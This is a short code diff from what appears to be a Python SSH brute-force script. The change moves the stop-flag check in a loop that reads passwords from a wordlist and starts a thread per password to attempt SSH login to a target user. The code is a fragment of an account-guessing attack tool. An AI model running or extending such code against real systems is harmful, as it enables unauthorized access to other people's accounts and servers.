@@ -40,12 +40,12 @@ def search_pwd(file, target, user):
     global stop_flag
     with open(file, 'r', errors='ignore') as f:
         for line in f.readlines():
-            if stop_flag == 1:
-                t.join()
-                exit()
             password = line.strip()
             t = threading.Thread(target=ssh_connect, args=(password, target, user))
             t.start()
+            if stop_flag == 1:
+                t.join()
+                exit()
             time.sleep(0.5)
 
 
